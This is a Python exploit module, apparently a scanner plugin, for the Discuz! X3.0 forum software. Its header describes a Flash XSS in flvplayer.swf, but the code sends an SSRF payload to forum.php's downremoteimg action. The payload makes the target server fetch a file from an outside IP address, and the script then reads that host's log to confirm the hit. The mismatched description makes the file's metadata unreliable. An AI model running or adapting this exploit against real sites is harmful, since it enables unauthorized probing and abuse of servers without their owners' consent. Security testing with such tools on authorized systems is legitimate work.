#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import time
import hashlib
import datetime
from script.lib import logger
from script.lib import requests

author = "SpongeB0B"
scope = "Discuz! x3.0"
description = "/static/image/common/flvplayer.swf Flash XSS"
reference = "http://www.ipuman.com/pm6/138/"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]

def exploit(url):
	headers = {
		"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
	}
	time_stamp = time.mktime(datetime.datetime.now().timetuple())
	m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
	md5_str = m.hexdigest()
	payload = "/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://45.76.158.91:6868/"+md5_str+".jpg[/img]&formhash=09cec465"
	vulnurl = url + payload
	req = requests.get(vulnurl, headers=headers, timeout=10)
	eye_url = "http://45.76.158.91/web.log"
	time.sleep(6)
	reqr = requests.get(eye_url, timeout=10)
	if md5_str in reqr.text:
		logger.success("[+]存在discuz论坛forum.php参数message SSRF漏洞...(中危)\tpayload: "+vulnurl)
		return vulnurl
